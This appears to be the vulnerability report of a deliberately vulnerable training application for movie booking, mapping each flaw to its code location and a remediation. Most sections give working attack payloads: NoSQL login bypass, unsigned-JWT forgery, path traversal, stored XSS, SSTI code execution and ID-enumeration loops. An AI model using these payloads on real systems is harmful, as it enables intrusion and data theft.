# BugMyShow - Vulnerability Assessment Report

## Overview
This document outlines all security vulnerabilities present in the BugMyShow application, their locations, exploitation methods, and sample payloads.

⚠️ **WARNING**: This application is intentionally vulnerable and should NEVER be deployed in production.

---

## 1. Authentication Vulnerabilities

### 1.1 SQL/NoSQL Injection in Login
**Location**: `server/routes/auth.js` - Line 11-30  
**Severity**: Critical  
**Description**: Login endpoint accepts object-based queries allowing NoSQL injection.

**Exploitation**:
```bash
# Bypass authentication
curl -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Alternative bypass
curl -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": "bypass"}'
```

### 1.2 JWT Forgery (No Signature Verification)
**Location**: `server/middleware/auth.js` - Line 8-25  
**Severity**: Critical  
**Description**: JWT tokens are decoded without signature verification.

**Exploitation**:
```javascript
// Create forged JWT token
const header = btoa('{"alg":"none","typ":"JWT"}');
const payload = btoa('{"userId":"admin","username":"admin","isAdmin":true}');
const forgedToken = `${header}.${payload}.`;

// Use in requests
fetch('/api/admin/movies', {
  headers: { 'Authorization': `Bearer ${forgedToken}` }
});
```

### 1.3 Weak Password Policy
**Location**: `server/routes/auth.js` - Line 70-75  
**Severity**: Medium  
**Description**: No password strength requirements.

**Exploitation**:
```bash
# Register with weak password
curl -X POST http://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "weak", "email": "weak@test.com", "password": "1"}'
```

### 1.4 Insecure Session Cookies
**Location**: `server/routes/auth.js` - Line 55-59  
**Severity**: High  
**Description**: Cookies lack security flags.

**Exploitation**:
```javascript
// Access token via JavaScript (not httpOnly)
console.log(document.cookie);

// CSRF possible due to SameSite=none
```

---

## 2. File Upload Vulnerabilities

### 2.1 Unrestricted File Upload
**Location**: `server/routes/user.js` - Line 8-20  
**Severity**: Critical  
**Description**: No file type or size restrictions.

**Exploitation**:
```bash
# Upload malicious file
curl -X POST http://localhost:5001/api/user/upload \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "profilePicture=@malicious.php"

# Upload executable
curl -X POST http://localhost:5001/api/user/upload \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "profilePicture=@backdoor.exe"
```

### 2.2 Path Traversal in Filenames
**Location**: `server/routes/user.js` - Line 15  
**Severity**: High  
**Description**: Original filename used without sanitization.

**Exploitation**:
```bash
# Upload to parent directory
curl -X POST http://localhost:5001/api/user/upload \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "profilePicture=@../../../etc/passwd;filename=../../../malicious.txt"
```

---

## 3. Cross-Site Scripting (XSS)

### 3.1 Stored XSS in Reviews
**Location**: `src/components/MovieDetail.tsx` - Line 320  
**Severity**: High  
**Description**: Review comments rendered with dangerouslySetInnerHTML.

**Exploitation**:
```javascript
// Submit malicious review
{
  "user": "attacker",
  "comment": "<script>alert('Stored XSS')</script>",
  "rating": 5
}

// Alternative payload
{
  "user": "attacker", 
  "comment": "<img src=x onerror=fetch('/api/debug').then(r=>r.text()).then(d=>alert(d))>",
  "rating": 5
}
```

---

## 4. Business Logic Vulnerabilities

### 4.1 Price Manipulation
**Location**: `server/routes/bookings.js` - Line 15-35  
**Severity**: Critical  
**Description**: Client-controlled pricing without server validation.

**Exploitation**:
```bash
# Book tickets for $0.01
curl -X POST http://localhost:5001/api/bookings \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "movieId": "1",
    "seats": 2,
    "totalPrice": 0.01,
    "showTime": "19:00"
  }'
```

### 4.2 Race Condition in Seat Booking
**Location**: `server/routes/bookings.js` - Line 45-65  
**Severity**: Medium  
**Description**: Non-atomic seat reservation operations.

**Exploitation**:
```bash
# Run multiple concurrent requests
for i in {1..10}; do
  curl -X POST http://localhost:5001/api/bookings/reserve \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d '{"movieId": "1", "seats": 50}' &
done
```

---

## 5. Access Control Vulnerabilities

### 5.1 Insecure Direct Object Reference (IDOR)
**Location**: `server/routes/bookings.js` - Line 75-85  
**Severity**: High  
**Description**: Access any booking without ownership verification.

**Exploitation**:
```bash
# Access other users' bookings
curl http://localhost:5001/api/bookings/1
curl http://localhost:5001/api/bookings/2
curl http://localhost:5001/api/bookings/3

# Enumerate all bookings
for i in {1..100}; do
  curl -s http://localhost:5001/api/bookings/$i | grep -q "movie_title" && echo "Booking $i exists"
done
```

### 5.2 IDOR in Ticket Access
**Location**: `server/routes/tickets.js` - Line 85-120  
**Severity**: High  
**Description**: Access any ticket by ticket number without ownership check.

**Exploitation**:
```bash
# Access tickets by number
curl http://localhost:5001/api/tickets/by-number/1001 \
  -H "Authorization: Bearer YOUR_TOKEN"

# Enumerate tickets
for i in {1001..2000}; do
  curl -s http://localhost:5001/api/tickets/by-number/$i \
    -H "Authorization: Bearer YOUR_TOKEN" | grep -q "success" && echo "Ticket $i found"
done
```

### 5.3 Broken Access Control in User Profiles
**Location**: `server/routes/user.js` - Line 35-50  
**Severity**: Medium  
**Description**: View any user profile without authorization.

**Exploitation**:
```bash
# Access other users' profiles
curl http://localhost:5001/api/user/1
curl http://localhost:5001/api/user/admin
```

### 5.4 Privilege Escalation
**Location**: `server/routes/admin.js` - Line 8-20  
**Severity**: Critical  
**Description**: Hardcoded admin credentials.

**Exploitation**:
```bash
# Login as admin
curl -X POST http://localhost:5001/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'
```

---

## 6. Information Disclosure

### 6.1 Sensitive Data Exposure
**Location**: `server/routes/bookings.js` - Line 90-95  
**Severity**: Medium  
**Description**: Returns all bookings without authentication.

**Exploitation**:
```bash
# Get all bookings
curl http://localhost:5001/api/bookings
```

### 6.2 Debug Endpoint Exposure
**Location**: `server/server.js` - Line 35-45  
**Severity**: High  
**Description**: Debug endpoint reveals system information.

**Exploitation**:
```bash
# Access debug info
curl http://localhost:5001/api/debug
```

### 6.3 Verbose Error Messages
**Location**: `server/server.js` - Line 50-55  
**Severity**: Low  
**Description**: Stack traces exposed in error responses.

**Exploitation**:
```bash
# Trigger error to see stack trace
curl http://localhost:5001/api/nonexistent
```

---

## 7. Server-Side Template Injection (SSTI)

### 7.1 Template Injection in Ticket Generation
**Location**: `server/routes/tickets.js` - Line 60-85  
**Severity**: Critical  
**Description**: Username processed as template without sanitization.

**Exploitation**:
```bash
# Register user with malicious username
curl -X POST http://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "{{7*7}}",
    "email": "test@test.com", 
    "password": "password"
  }'

# More dangerous payload
curl -X POST http://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "${process.env}",
    "email": "test2@test.com",
    "password": "password"
  }'

# RCE payload
curl -X POST http://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "{{constructor.constructor(\"return process.env\")()}}",
    "email": "test3@test.com",
    "password": "password"
  }'
```

---

## 8. Other Vulnerabilities

### 8.1 Open Redirect
**Location**: `server/routes/payment.js` - Line 5-15  
**Severity**: Medium  
**Description**: Unvalidated redirect parameter.

**Exploitation**:
```bash
# Redirect to malicious site
curl "http://localhost:5001/api/payment/callback?redirect=https://evil.com"
```

### 8.2 Missing CORS Configuration
**Location**: `server/server.js` - Line 10  
**Severity**: Low  
**Description**: Permissive CORS policy.

**Exploitation**:
```javascript
// Cross-origin requests allowed from any domain
fetch('http://localhost:5001/api/debug', {
  method: 'GET',
  credentials: 'include'
});
```

---

## Exploitation Scenarios

### Scenario 1: Complete Account Takeover
1. Use NoSQL injection to bypass login
2. Forge JWT token for admin access
3. Access all user data via IDOR
4. Modify any booking prices

### Scenario 2: Data Exfiltration
1. Access debug endpoint for system info
2. Use IDOR to enumerate all bookings
3. Extract user emails and booking data
4. Use stored XSS in reviews to steal session tokens

### Scenario 3: Remote Code Execution
1. Register account with SSTI payload in username
2. Book a ticket to trigger template processing
3. Execute arbitrary code on server
4. Gain full system access

---

## Remediation Summary

1. **Input Validation**: Sanitize all user inputs
2. **Authentication**: Implement proper JWT verification
3. **Authorization**: Add ownership checks for all resources
4. **File Upload**: Restrict file types and sanitize filenames
5. **Output Encoding**: Escape all dynamic content
6. **Business Logic**: Server-side price validation
7. **Error Handling**: Generic error messages
8. **Security Headers**: Implement proper CORS and security headers

---

**Disclaimer**: This documentation is for educational purposes only. Do not use these techniques against systems you do not own or have explicit permission to test.